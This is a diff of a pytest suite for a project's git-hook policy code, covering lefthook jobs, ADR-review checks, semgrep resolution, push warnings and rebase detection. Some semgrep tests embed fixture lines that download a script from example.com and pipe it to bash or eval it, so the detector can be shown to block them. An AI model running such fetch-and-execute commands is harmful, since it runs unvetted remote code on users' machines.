@@ -96,6 +96,11 @@ def _git(
     *args: str,
     check: bool = True,
 ) -> subprocess.CompletedProcess[str]:
+    # GIT_EDITOR and GIT_SEQUENCE_EDITOR outrank -c core.editor, so a developer
+    # who exports either one can make an editor-launching git command in a test
+    # fail before the assertion under test ever runs. Pin them to true so the
+    # suite does not depend on the invoking shell.
+    env = {**os.environ, "GIT_EDITOR": "true", "GIT_SEQUENCE_EDITOR": "true"}
     return subprocess.run(
         ["git", *args],
         cwd=repo,
@@ -104,6 +109,7 @@ def _git(
         errors="replace",
         capture_output=True,
         check=check,
+        env=env,
     )
 
 
@@ -314,10 +320,13 @@ def test_adr_review_policy_blocks_stale_debate_reference(
     tmp_path: Path,
     capsys: pytest.CaptureFixture[str],
 ) -> None:
+    # A debate log exists in the correct dir (.agents/critique/) but references
+    # a DIFFERENT ADR (ADR-042), not the staged ADR (ADR-062). This exercises
+    # the stale-reference branch, not the missing-log branch.
     _write_today_session(tmp_path, '{"notes": "/adr-review was run"}')
-    analysis = tmp_path / ".agents" / "analysis"
-    analysis.mkdir(parents=True)
-    _write_lf(analysis / "old-debate.md", "ADR-042 review")
+    critique = tmp_path / ".agents" / "critique"
+    critique.mkdir(parents=True)
+    _write_lf(critique / "adr-042-debate.md", "ADR-042 review")
 
     result = policy.check_adr_review_policy(
         [".agents/architecture/ADR-062-navigation.md"],
@@ -330,9 +339,9 @@ def test_adr_review_policy_blocks_stale_debate_reference(
 
 def test_adr_review_policy_allows_fresh_evidence_and_no_adr_change(tmp_path: Path) -> None:
     _write_today_session(tmp_path, '{"notes": "/adr-review was run"}')
-    analysis = tmp_path / ".agents" / "analysis"
-    analysis.mkdir(parents=True)
-    _write_lf(analysis / "adr-062-debate.md", "ADR-062 review")
+    critique = tmp_path / ".agents" / "critique"
+    critique.mkdir(parents=True)
+    _write_lf(critique / "adr-062-debate.md", "ADR-062 review")
 
     assert (
         policy.check_adr_review_policy(
@@ -346,9 +355,9 @@ def test_adr_review_policy_allows_fresh_evidence_and_no_adr_change(tmp_path: Pat
 
 def test_adr_review_policy_matches_complete_adr_ids(tmp_path: Path) -> None:
     _write_today_session(tmp_path, '{"notes": "/adr-review was run"}')
-    analysis = tmp_path / ".agents" / "analysis"
-    analysis.mkdir(parents=True)
-    _write_lf(analysis / "adr-0620-debate.md", "ADR-0620 review")
+    critique = tmp_path / ".agents" / "critique"
+    critique.mkdir(parents=True)
+    _write_lf(critique / "adr-0620-debate.md", "ADR-0620 review")
 
     assert (
         policy.check_adr_review_policy(
@@ -363,11 +372,11 @@ def test_adr_review_policy_rejects_symlinked_debate_evidence(tmp_path: Path) -> 
     if os.name == "nt":
         pytest.skip("Symlink creation requires elevated Windows privileges")
     _write_today_session(tmp_path, '{"notes": "/adr-review was run"}')
-    analysis = tmp_path / ".agents" / "analysis"
-    analysis.mkdir(parents=True)
+    critique = tmp_path / ".agents" / "critique"
+    critique.mkdir(parents=True)
     evidence = tmp_path / "evidence.md"
     _write_lf(evidence, "ADR-062 review")
-    (analysis / "adr-062-debate.md").symlink_to(evidence)
+    (critique / "adr-062-debate.md").symlink_to(evidence)
 
     assert (
         policy.check_adr_review_policy(
@@ -376,6 +385,26 @@ def test_adr_review_policy_rejects_symlinked_debate_evidence(tmp_path: Path) -> 
         )
         == 1
     )
+
+
+def test_adr_review_policy_missing_critique_dir_fails(
+    tmp_path: Path,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    """No .agents/critique/ directory at all means no debate logs: gate fails."""
+    _write_today_session(tmp_path, '{"notes": "/adr-review was run"}')
+    # Only the old wrong dir exists; critique dir is absent.
+    wrong = tmp_path / ".agents" / "analysis"
+    wrong.mkdir(parents=True)
+    _write_lf(wrong / "adr-062-debate.md", "ADR-062 review")
+
+    result = policy.check_adr_review_policy(
+        [".agents/architecture/ADR-062-navigation.md"],
+        tmp_path,
+    )
+
+    assert result == 1
+    assert ".agents/critique" in capsys.readouterr().err
 
 
 def test_retrospective_policy_blocks_missing_evidence(
@@ -575,6 +604,7 @@ def test_configuration_uses_named_native_jobs() -> None:
         "stage-memory-cross-references",
         "memory-sync-advisory",
         "extract-session-episodes",
+        "commit-file-count",
     }
     expected_pre_push = {
         "repair-packed-refs",
@@ -619,6 +649,9 @@ def test_configuration_uses_named_native_jobs() -> None:
     )
     assert pre_commit_names.index("memory-skill-format") < pre_commit_names.index(
         "memory-sync-advisory"
+    )
+    assert pre_commit_names.index("extract-session-episodes") < pre_commit_names.index(
+        "commit-file-count"
     )
 
 
@@ -729,7 +762,9 @@ def test_configuration_uses_native_filters_scheduling_and_staging() -> None:
         "stage-memory-cross-references",
         "memory-sync-advisory",
         "extract-session-episodes",
+        "commit-file-count",
         "memory-size",
+        "taste-advisory",
     }
     pure_jobs = {
         "action-pin-policy",
@@ -745,7 +780,6 @@ def test_configuration_uses_native_filters_scheduling_and_staging() -> None:
         "memory-tier",
         "memory-skill-format",
         "adr-review-policy",
-        "taste-advisory",
     }
     for name in merge_exempt_jobs:
         skip = pre_commit_jobs[name].get("skip", [])
@@ -873,9 +907,12 @@ def test_lefthook_skip_envs_preserve_check_only_execution(tmp_path: Path) -> Non
     repo = tmp_path / "repo"
     _init_repo(repo)
     marker = repo / "marker.py"
-    _write_lf(marker, "from pathlib import Path\nimport sys\n"
+    _write_lf(
+        marker,
+        "from pathlib import Path\nimport sys\n"
         "p=Path('jobs.log'); old=p.read_text() if p.exists() else ''\n"
-        "p.write_text(old + sys.argv[1] + '\\n')\n")
+        "p.write_text(old + sys.argv[1] + '\\n')\n",
+    )
     jobs = [
         {
             "name": "autofix",
@@ -1123,8 +1160,11 @@ def test_doublestar_selects_root_level_push_file(tmp_path: Path) -> None:
     _copy_runtime_config(repo)
     detector = repo / ".claude/skills/security-detection/detect_infrastructure.py"
     detector.parent.mkdir(parents=True, exist_ok=True)
-    _write_lf(detector, "from pathlib import Path\nimport sys\n"
-        "Path('root-job-ran.txt').write_text(','.join(sys.argv[1:]), encoding='utf-8')\n")
+    _write_lf(
+        detector,
+        "from pathlib import Path\nimport sys\n"
+        "Path('root-job-ran.txt').write_text(','.join(sys.argv[1:]), encoding='utf-8')\n",
+    )
     _write_lf(repo / "root-only.txt", "base\n")
     _git(repo, "add", ".")
     _git(repo, "commit", "-qm", "test: base")
@@ -1157,11 +1197,14 @@ def test_doublestar_matches_nested_and_root_pre_commit_files(tmp_path: Path) -> 
     repo = tmp_path / "repo"
     _init_repo(repo)
     marker = repo / "marker.py"
-    _write_lf(marker, "from pathlib import Path\nimport sys\n"
+    _write_lf(
+        marker,
+        "from pathlib import Path\nimport sys\n"
         "p = Path('jobs.log')\n"
         "old = p.read_text() if p.exists() else ''\n"
         "entry = sys.argv[1] + ':' + ','.join(sys.argv[2:]) + '\\n'\n"
-        "p.write_text(old + entry)\n")
+        "p.write_text(old + entry)\n",
+    )
     config = {
         "glob_matcher": "doublestar",
         "pre-commit": {
@@ -1199,10 +1242,13 @@ def test_doublestar_matches_nested_pre_push_policy_jobs(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
     _init_repo(repo)
     marker = repo / "marker.py"
-    _write_lf(marker, "from pathlib import Path\nimport sys\n"
+    _write_lf(
+        marker,
+        "from pathlib import Path\nimport sys\n"
         "p = Path('jobs.log')\n"
         "old = p.read_text() if p.exists() else ''\n"
-        "p.write_text(old + sys.argv[1] + '\\n')\n")
+        "p.write_text(old + sys.argv[1] + '\\n')\n",
+    )
     jobs = [
         {"name": "mypy", "run": f'"{PYTHON_POSIX}" marker.py mypy', "glob": "**/*.py"},
         {
@@ -1253,10 +1299,13 @@ def test_piped_pre_push_stdin_group_broadcasts_to_each_job(tmp_path: Path) -> No
     repo = tmp_path / "repo"
     _init_repo(repo)
     marker = repo / "marker.py"
-    _write_lf(marker, "from pathlib import Path\nimport sys\n"
+    _write_lf(
+        marker,
+        "from pathlib import Path\nimport sys\n"
         "p = Path('stdin.log')\n"
         "old = p.read_text() if p.exists() else ''\n"
-        "p.write_text(old + sys.argv[1] + ':' + sys.stdin.read())\n")
+        "p.write_text(old + sys.argv[1] + ':' + sys.stdin.read())\n",
+    )
     jobs = [
         {
             "name": name,
@@ -1295,8 +1344,11 @@ def test_native_push_files_cover_unpushed_branch_files(tmp_path: Path) -> None:
     _commit_file(repo, "one.py", "one = 1\n")
     head = _commit_file(repo, "two.yml", "two: true\n")
     marker = repo / "marker.py"
-    _write_lf(marker, "from pathlib import Path\nimport sys\n"
-        "Path('push-files.log').write_text('\\n'.join(sys.argv[1:]))\n")
+    _write_lf(
+        marker,
+        "from pathlib import Path\nimport sys\n"
+        "Path('push-files.log').write_text('\\n'.join(sys.argv[1:]))\n",
+    )
     config = {
         "glob_matcher": "doublestar",
         "pre-push": {
@@ -1457,9 +1509,12 @@ def test_stage_fixed_restages_only_the_formatted_input(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
     _init_repo(repo)
     fixer = repo / "fixer.py"
-    _write_lf(fixer, "from pathlib import Path\nimport sys\n"
+    _write_lf(
+        fixer,
+        "from pathlib import Path\nimport sys\n"
         "Path(sys.argv[1]).write_text('fixed\\n', encoding='utf-8')\n"
-        "Path('generated.txt').write_text('generated\\n', encoding='utf-8')\n")
+        "Path('generated.txt').write_text('generated\\n', encoding='utf-8')\n",
+    )
     config = {
         "pre-commit": {
             "jobs": [
@@ -2212,13 +2267,16 @@ def test_lefthook_filters_use_active_git_index(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
     _init_repo(repo)
     recorder = repo / "record_staged.py"
-    _write_lf(recorder, "import os\n"
+    _write_lf(
+        recorder,
+        "import os\n"
         "import sys\n"
         "from pathlib import Path\n"
         "Path('observed.txt').write_text(\n"
         "    os.environ.get('GIT_INDEX_FILE', '') + '\\n' + '\\n'.join(sys.argv[1:]),\n"
         "    encoding='utf-8',\n"
-        ")\n")
+        ")\n",
+    )
     config = {
         "pre-commit": {
             "jobs": [
@@ -2384,18 +2442,26 @@ def test_skillforge_excludes_fixtures_and_command_mirrors(
         calls.append(list(args))
         return _completed(0)
 
+    # `build` is a generated command mirror because .claude/commands/build.md
+    # exists; `hand-written` sits in the same directory with no command source,
+    # so it is an authored skill and must still reach the validator.
+    commands = tmp_path / ".claude" / "commands"
+    commands.mkdir(parents=True)
+    (commands / "build.md").write_text("# build\n", encoding="utf-8")
+
     monkeypatch.setattr(policy, "_run_command", fake_run)
     result = policy.run_skillforge(
         [
             "evals/example/SKILL.md",
             "src/copilot-cli/skills/build/SKILL.md",
+            "src/copilot-cli/skills/hand-written/SKILL.md",
             ".claude/skills/real-skill/SKILL.md",
         ],
         tmp_path,
     )
 
     # Fixtures and command mirrors are skipped before any subprocess runs, so
-    # the only skill that reaches SkillForge is the real one. The
+    # the skills that reach SkillForge are the authored ones. The
     # frontmatter-only exemption probes HEAD and index blobs via _run_command
     # first, so filter to the validator invocation rather than counting every
     # subprocess call.
@@ -2403,8 +2469,60 @@ def test_skillforge_excludes_fixtures_and_command_mirrors(
         call for call in calls if any("validate-skill.py" in str(arg) for arg in call)
     ]
     assert result == 0
-    assert len(validate_calls) == 1
-    assert validate_calls[0][-1] == ".claude/skills/real-skill"
+    assert [call[-1] for call in validate_calls] == [
+        "src/copilot-cli/skills/hand-written",
+        ".claude/skills/real-skill",
+    ]
+
+
+def test_skillforge_mirror_skip_is_derived_from_the_commands_directory(
+    tmp_path: Path,
+) -> None:
+    """The mirror set has one source of truth: .claude/commands/<name>.md.
+
+    Enumerating names in lefthook.yml and again in git_hook_policy.py is what
+    let the two lists drift (9 of 14 in one, 14 in the other).
+    """
+    commands = tmp_path / ".claude" / "commands"
+    commands.mkdir(parents=True)
+    (commands / "research.md").write_text("# research\n", encoding="utf-8")
+
+    # Positive: a mirror whose command source exists is skipped.
+    assert (
+        policy._skip_skillforge_path("src/copilot-cli/skills/research/SKILL.md", tmp_path) is True
+    )
+    # Positive: eval fixtures are skipped regardless of the commands directory.
+    assert policy._skip_skillforge_path("evals/example/SKILL.md", tmp_path) is True
+
+    # Negative: no command source, so the skill is authored and stays gated.
+    assert (
+        policy._skip_skillforge_path("src/copilot-cli/skills/analyze/SKILL.md", tmp_path) is False
+    )
+    # Negative: the Claude tree is never a mirror, even for a command name.
+    assert policy._skip_skillforge_path(".claude/skills/research/SKILL.md", tmp_path) is False
+
+    # Edge: a nested file under a mirror directory is not the mirror itself.
+    assert (
+        policy._skip_skillforge_path(
+            "src/copilot-cli/skills/research/references/workflow.md", tmp_path
+        )
+        is False
+    )
+    # Edge: a sub-directory command (forgetful/memory-save.md) has no flat
+    # mirror, so the flat path must not be skipped on its account.
+    assert (
+        policy._skip_skillforge_path("src/copilot-cli/skills/memory-save/SKILL.md", tmp_path)
+        is False
+    )
+
+
+def test_lefthook_skillforge_exclude_does_not_restate_the_mirror_names() -> None:
+    """lefthook.yml must not carry a second copy of the mirror list."""
+    config = yaml.safe_load((PROJECT_ROOT / "lefthook.yml").read_text(encoding="utf-8"))
+
+    excludes = _job_map(config, "pre-commit")["skillforge"]["exclude"]
+
+    assert excludes == ["evals/**"]
 
 
 def test_generated_staging_uses_the_named_allowlist(tmp_path: Path) -> None:
@@ -2863,6 +2981,148 @@ def test_pushed_semgrep_detects_collision_with_unchanged_head_path(
     assert policy.scan_pushed_heads(io.StringIO(), tmp_path) == 2
 
 
+def test_semgrep_uses_sibling_binary_without_version_probe(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    policy._resolve_semgrep_executable.cache_clear()
+    policy._semgrep_pinned_version.cache_clear()
+    bin_dir = tmp_path / "venv" / "bin"
+    bin_dir.mkdir(parents=True)
+    sibling = bin_dir / ("semgrep.exe" if os.name == "nt" else "semgrep")
+    sibling.write_text("", encoding="utf-8")
+    sibling.chmod(0o755)
+    monkeypatch.setattr(policy.sys, "executable", str(bin_dir / "python"))
+    calls: list[list[str]] = []
+
+    def fake_run(
+        args: Sequence[str],
+        *_args: object,
+        **_kwargs: object,
+    ) -> subprocess.CompletedProcess[str]:
+        calls.append(list(args))
+        assert args[1] != "--version"
+        return _semgrep_completed(0, [tmp_path / "source.py"])
+
+    monkeypatch.setattr(policy, "_run_command", fake_run)
+
+    result = policy._run_semgrep_tree(tmp_path, ["source.py"], tmp_path)
+
+    assert result.returncode == 0
+    assert calls[0][0] == str(sibling)
+    policy._resolve_semgrep_executable.cache_clear()
+    policy._semgrep_pinned_version.cache_clear()
+
+
+def test_semgrep_falls_back_to_matching_path_binary(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    policy._resolve_semgrep_executable.cache_clear()
+    policy._semgrep_pinned_version.cache_clear()
+    bin_dir = tmp_path / "venv" / "bin"
+    bin_dir.mkdir(parents=True)
+    fallback = tmp_path / "path-semgrep"
+    monkeypatch.setattr(policy.sys, "executable", str(bin_dir / "python"))
+    monkeypatch.setattr(policy.shutil, "which", lambda command: str(fallback))
+    monkeypatch.setattr(policy, "_semgrep_pinned_version", lambda _repo_root=tmp_path: "1.171.0")
+    calls: list[list[str]] = []
+
+    def fake_run(
+        args: Sequence[str],
+        *_args: object,
+        **_kwargs: object,
+    ) -> subprocess.CompletedProcess[str]:
+        calls.append(list(args))
+        if args == [str(fallback), "--version"]:
+            return subprocess.CompletedProcess(args, 0, "1.171.0\n", "")
+        return _semgrep_completed(0, [tmp_path / "source.py"])
+
+    monkeypatch.setattr(policy, "_run_command", fake_run)
+
+    result = policy._run_semgrep_tree(tmp_path, ["source.py"], tmp_path)
+
+    assert result.returncode == 0
+    assert calls[0] == [str(fallback), "--version"]
+    assert calls[1][0] == str(fallback)
+    policy._resolve_semgrep_executable.cache_clear()
+
+
+def test_semgrep_fallback_version_mismatch_blocks(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    policy._resolve_semgrep_executable.cache_clear()
+    policy._semgrep_pinned_version.cache_clear()
+    bin_dir = tmp_path / "venv" / "bin"
+    bin_dir.mkdir(parents=True)
+    fallback = tmp_path / "path-semgrep"
+    monkeypatch.setattr(policy.sys, "executable", str(bin_dir / "python"))
+    monkeypatch.setattr(policy.shutil, "which", lambda command: str(fallback))
+    monkeypatch.setattr(policy, "_semgrep_pinned_version", lambda _repo_root=tmp_path: "1.171.0")
+    calls: list[list[str]] = []
+
+    def fake_run(
+        args: Sequence[str],
+        *_args: object,
+        **_kwargs: object,
+    ) -> subprocess.CompletedProcess[str]:
+        calls.append(list(args))
+        return subprocess.CompletedProcess(args, 0, "1.153.1\n", "")
+
+    monkeypatch.setattr(policy, "_run_command", fake_run)
+
+    result = policy._run_semgrep_tree(tmp_path, ["source.py"], tmp_path)
+
+    assert result.returncode == 2
+    assert "pyproject.toml pins 1.171.0" in result.stderr
+    assert str(fallback) in result.stderr
+    assert "1.153.1" in result.stderr
+    assert calls == [[str(fallback), "--version"]]
+    policy._resolve_semgrep_executable.cache_clear()
+
+
+def test_semgrep_missing_pyproject_reports_pin_read_failure(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    policy._resolve_semgrep_executable.cache_clear()
+    policy._semgrep_pinned_version.cache_clear()
+    bin_dir = tmp_path / "venv" / "bin"
+    bin_dir.mkdir(parents=True)
+    fallback = tmp_path / "path-semgrep"
+    monkeypatch.setattr(policy.sys, "executable", str(bin_dir / "python"))
+    monkeypatch.setattr(policy.shutil, "which", lambda command: str(fallback))
+    monkeypatch.setattr(
+        policy,
+        "_run_command",
+        lambda args, *_args, **_kwargs: subprocess.CompletedProcess(
+            args,
+            0,
+            "1.171.0\n",
+            "",
+        ),
+    )
+
+    result = policy._run_semgrep_tree(tmp_path, ["source.py"], tmp_path)
+
+    assert result.returncode == 2
+    assert "cannot read semgrep pin from" in result.stderr
+    assert "pyproject.toml" in result.stderr
+    assert "semgrep executable not found" not in result.stderr
+    policy._resolve_semgrep_executable.cache_clear()
+    policy._semgrep_pinned_version.cache_clear()
+
+
+def test_semgrep_pin_is_read_from_pyproject() -> None:
+    policy._semgrep_pinned_version.cache_clear()
+    pyproject = PROJECT_ROOT / "pyproject.toml"
+    matches = re.findall(r'^\s*"semgrep==([^"]+)",\s*$', pyproject.read_text(), re.MULTILINE)
+
+    assert matches == [policy._semgrep_pinned_version(PROJECT_ROOT)] * 2
+    policy._semgrep_pinned_version.cache_clear()
+
+
 def test_semgrep_missing_executable_blocks(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
@@ -2911,14 +3171,17 @@ def test_semgrep_real_cli_scans_ignored_file_over_default_size_limit(
     _write_lf(target, "value = 1\n" + "# padding\n" * 110_000)
     _write_lf(tmp_path / ".semgrepignore", f"{target.name}\n")
     config = tmp_path / "semgrep.yml"
-    _write_lf(config, """
+    _write_lf(
+        config,
+        """
 rules:
   - id: impossible-equality
     languages: [python]
     message: impossible
     severity: ERROR
     pattern: $X == $X
-""".lstrip())
+""".lstrip(),
+    )
     command = policy._semgrep_command(str(config), [str(target)])
     assert SEMGREP is not None
     command[0] = SEMGREP
@@ -2944,7 +3207,9 @@ def test_semgrep_real_cli_blocks_bash_curl_rules_with_powershell_step(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "mixed-shell-action.yml"
-    _write_lf(target, """
+    _write_lf(
+        target,
+        """
 name: mixed shell
 runs:
   using: composite
@@ -2959,7 +3224,8 @@ runs:
         DATA=$(curl -fsSL https://example.com/install.sh)
         eval "$DATA"
         curl -fsSL https://example.com/install.sh | bash
-""".lstrip())
+""".lstrip(),
+    )
 
     result = policy._run_semgrep_tree(tmp_path, [target.name], tmp_path)
 
@@ -3072,13 +3338,16 @@ def test_semgrep_allows_known_powershell_parser_mismatch(
 
 def test_semgrep_allows_partial_parsing_at_powershell_step(tmp_path: Path) -> None:
     target = tmp_path / "action.yml"
-    _write_lf(target, "runs:\n"
+    _write_lf(
+        target,
+        "runs:\n"
         "  steps:\n"
         "    - shell: pwsh\n"
         "      run: |\n"
         "        Write-Host 'safe'\n"
         "    - shell: bash\n"
-        "      run: echo safe\n")
+        "      run: echo safe\n",
+    )
     payload = {
         "errors": [_powershell_partial_parsing_error(target, line=4)],
         "paths": {"scanned": [str(target)]},
@@ -3133,14 +3402,17 @@ def test_semgrep_rejects_code_two_error_at_bash_step_in_mixed_shell_file(
 ) -> None:
     target = tmp_path / "action.yml"
     bash_script = 'DATA=$(curl -fsSL https://example.com/install.sh)\neval "$DATA"'
-    _write_lf(target, "runs:\n"
+    _write_lf(
+        target,
+        "runs:\n"
         "  steps:\n"
         "    - shell: pwsh\n"
         "      run: Write-Host 'safe'\n"
         "    - shell: bash\n"
         "      run: |\n"
         "        DATA=$(curl -fsSL https://example.com/install.sh)\n"
-        '        eval "$DATA"\n')
+        '        eval "$DATA"\n',
+    )
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3166,12 +3438,15 @@ def test_semgrep_rejects_code_two_error_with_ambiguous_shell_attribution(
 ) -> None:
     target = tmp_path / "action.yml"
     script = 'Write-Host "safe"'
-    _write_lf(target, "runs:\n"
+    _write_lf(
+        target,
+        "runs:\n"
         "  steps:\n"
         "    - shell: pwsh\n"
         f"      run: {script}\n"
         "    - shell: bash\n"
-        f"      run: {script}\n")
+        f"      run: {script}\n",
+    )
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3265,12 +3540,15 @@ def test_semgrep_accepts_code_two_error_for_aliased_powershell_step(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "action.yml"
-    _write_lf(target, "shared: &shared\n"
+    _write_lf(
+        target,
+        "shared: &shared\n"
         "  shell: pwsh\n"
         '  run: Write-Host "safe"\n'
         "runs:\n"
         "  steps:\n"
-        "    - *shared\n")
+        "    - *shared\n",
+    )
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3294,12 +3572,15 @@ def test_semgrep_rejects_nontruncated_code_two_snippet_prefix(
     tmp_path: Path,
 ) -> None:
     target = tmp_path / "action.yml"
-    _write_lf(target, "runs:\n"
+    _write_lf(
+        target,
+        "runs:\n"
         "  steps:\n"
         "    - shell: pwsh\n"
         "      run: |\n"
         "        Write-Host 'first'\n"
-        "        Write-Host 'second'\n")
+        "        Write-Host 'second'\n",
+    )
     payload = {
         "errors": [
             _powershell_semgrep_error(
@@ -3325,10 +3606,13 @@ def test_semgrep_accepts_long_truncated_code_two_powershell_snippet(
 ) -> None:
     target = tmp_path / "action.yml"
     lines = [f"Write-Host 'verification line {index}'" for index in range(5)]
-    _write_lf(target, "runs:\n"
+    _write_lf(
+        target,
+        "runs:\n"
         "  steps:\n"
         "    - shell: pwsh\n"
-        "      run: |\n" + "".join(f"        {line}\n" for line in lines))
+        "      run: |\n" + "".join(f"        {line}\n" for line in lines),
+    )
     snippet = "\n".join([*lines[:-1], lines[-1][:15]])
     payload = {
         "errors": [
@@ -3370,12 +3654,15 @@ def test_semgrep_rejects_unrecognized_partial_parsing_error(
     rule_id: str,
 ) -> None:
     target = tmp_path / "action.yml"
-    _write_lf(target, "runs:\n"
+    _write_lf(
+        target,
+        "runs:\n"
         "  steps:\n"
         "    - shell: pwsh\n"
         "      run: Write-Host 'safe'\n"
         "    - shell: bash\n"
-        "      run: echo safe\n")
+        "      run: echo safe\n",
+    )
     payload = {
         "errors": [
             _powershell_partial_parsing_error(
@@ -3969,6 +4256,11 @@ def test_mypy_policy_aggregates_failures_and_ignores_deleted_files(
     assert policy.run_mypy(["source.py", "deleted.py"], tmp_path) == 1
 
 
+def test_mypy_policy_rejects_empty_paths(tmp_path: Path) -> None:
+    """#3966: run_mypy with no file arguments must return rc=2 (false green guard)."""
+    assert policy.run_mypy([], tmp_path) == 2
+
+
 def test_mypy_policy_rejects_unsafe_paths_and_symlinks(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
@@ -4341,6 +4633,69 @@ def test_push_files_warning_emits_for_new_branch(
     assert "quality coverage may be incomplete" in capsys.readouterr().err
 
 
+def test_push_files_warning_is_quiet_for_explicit_refspec_push(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    """HEAD pushed to a differently-named remote branch must not warn.
+
+    Reproduces issue #4236: autofix worktrees push checked-out HEAD to the PR's
+    branch using 'git push origin HEAD:pr-branch'. The local ref and remote ref
+    differ, but the local commit IS the checked-out HEAD, so {push_files} covers
+    the pushed files. The warning should be silent.
+    """
+    head = "1" * 40
+
+    def run_git(_repo_root: Path, args: list[str]) -> subprocess.CompletedProcess[str]:
+        if args == ["rev-parse", "HEAD"]:
+            return _completed(0, f"{head}\n")
+        if args == ["rev-parse", "--verify", "@{push}"]:
+            return _completed(128, "", "no upstream configured\n")
+        raise AssertionError(args)
+
+    monkeypatch.setattr(policy, "_run_git", run_git)
+
+    refs = [
+        policy.PushRef(
+            "refs/heads/local-repair",
+            head,
+            "refs/heads/pr-target-branch",
+            "0" * 40,
+        )
+    ]
+    policy.warn_if_push_files_incomplete(refs, tmp_path)
+
+    assert capsys.readouterr().err == ""
+
+
+def test_push_files_warning_emits_for_multi_ref_with_explicit_refspec(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    """Multiple refs still warn even if one is a HEAD explicit-refspec push."""
+    head = "1" * 40
+    other = "2" * 40
+
+    def run_git(_repo_root: Path, args: list[str]) -> subprocess.CompletedProcess[str]:
+        if args == ["rev-parse", "HEAD"]:
+            return _completed(0, f"{head}\n")
+        if args == ["rev-parse", "--verify", "@{push}"]:
+            return _completed(128, "", "no upstream\n")
+        raise AssertionError(args)
+
+    monkeypatch.setattr(policy, "_run_git", run_git)
+
+    refs = [
+        policy.PushRef("refs/heads/local-a", head, "refs/heads/pr-target", "0" * 40),
+        policy.PushRef("refs/heads/local-b", other, "refs/heads/local-b", "0" * 40),
+    ]
+    policy.warn_if_push_files_incomplete(refs, tmp_path)
+
+    assert "quality coverage may be incomplete" in capsys.readouterr().err
+
+
 def test_push_policy_allows_deletion_only_input(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
     _init_repo(repo)
@@ -4424,7 +4779,6 @@ def test_push_policy_blocks_resolved_uncommitted_merge(
 @pytest.mark.parametrize(
     ("head_file", "operation", "remedy"),
     [
-        ("REBASE_HEAD", "rebase", "git rebase --continue"),
         ("CHERRY_PICK_HEAD", "cherry-pick", "git cherry-pick --continue"),
     ],
 )
@@ -4449,6 +4803,171 @@ def test_push_policy_names_active_git_operation(
     error = capsys.readouterr().err
     assert f"{operation} in progress" in error
     assert remedy in error
+
+
+def test_push_policy_names_rebase_when_apply_dir_has_no_marker(
+    tmp_path: Path,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    """A marker-less rebase-apply is an apply-backend rebase, not a `git am`.
+
+    Negative counterpart to test_push_policy_reports_git_am_with_its_own_remedy,
+    which covers the marked case with a real `git am`. Nothing covered the other
+    side, so a marker check that widened to "any rebase-apply is a git am" would
+    have sent every apply-backend rebase to `git am --continue`, which fails.
+    """
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    _commit_file(repo, "tracked.txt", "base\n")
+    apply_dir = Path(_git(repo, "rev-parse", "--git-path", "rebase-apply").stdout.strip())
+    if not apply_dir.is_absolute():
+        apply_dir = repo / apply_dir
+    apply_dir.mkdir(parents=True, exist_ok=True)
+
+    result = policy.check_push_refs(io.StringIO(), repo)
+
+    assert result == 1
+    error = capsys.readouterr().err
+    assert "rebase in progress" in error
+    assert "git rebase --continue or git rebase --abort" in error
+    assert "git am --continue" not in error
+
+
+def _start_conflicted_rebase(repo: Path) -> None:
+    """Leave *repo* stopped mid-rebase on a conflict.
+
+    Both branches rewrite the same line, so replaying `topic` onto `other`
+    always conflicts and git halts with its rebase state directory in place.
+    """
+    _init_repo(repo)
+    _commit_file(repo, "tracked.txt", "base\n")
+    _git(repo, "checkout", "-q", "-b", "other")
+    _commit_file(repo, "tracked.txt", "other\n")
+    _git(repo, "checkout", "-q", "feature/test")
+    _commit_file(repo, "tracked.txt", "topic\n")
+    _git(repo, "rebase", "other", check=False)
+
+
+def test_push_policy_blocks_while_rebase_is_actually_in_progress(
+    tmp_path: Path,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    repo = tmp_path / "repo"
+    _start_conflicted_rebase(repo)
+
+    result = policy.check_push_refs(io.StringIO(), repo)
+
+    assert result == 1
+    error = capsys.readouterr().err
+    assert "rebase in progress" in error
+    assert "git rebase --continue" in error
+
+
+def test_push_policy_allows_push_after_a_conflicted_rebase_completes(
+    tmp_path: Path,
+) -> None:
+    """A finished rebase must not block the push that follows it.
+
+    Measured on git 2.43.0: REBASE_HEAD survives a conflicted rebase that has
+    already been continued to completion. Git's own code calls delete_ref on it,
+    so this is a cleanup gap rather than a documented guarantee. Treating the
+    leftover pointer as live state blocked every push after a conflict
+    resolution, and the advice it printed ("git rebase --continue") failed with
+    "No rebase in progress?", leaving `git update-ref -d REBASE_HEAD` as the
+    only way out.
+    """
+    repo = tmp_path / "repo"
+    _start_conflicted_rebase(repo)
+    _write_file(repo, "tracked.txt", "resolved\n")
+    _git(repo, "add", "tracked.txt")
+    _git(repo, "-c", "core.editor=true", "rebase", "--continue")
+
+    rebase_head = Path(_git(repo, "rev-parse", "--git-path", "REBASE_HEAD").stdout.strip())
+    if not rebase_head.is_absolute():
+        rebase_head = repo / rebase_head
+    assert rebase_head.is_file(), "expected git to leave REBASE_HEAD behind"
+
+    assert policy.check_push_refs(io.StringIO(), repo) == 0
+
+
+def test_push_policy_reports_git_am_with_its_own_remedy(
+    tmp_path: Path,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    """A stopped `git am` must not be reported as a rebase.
+
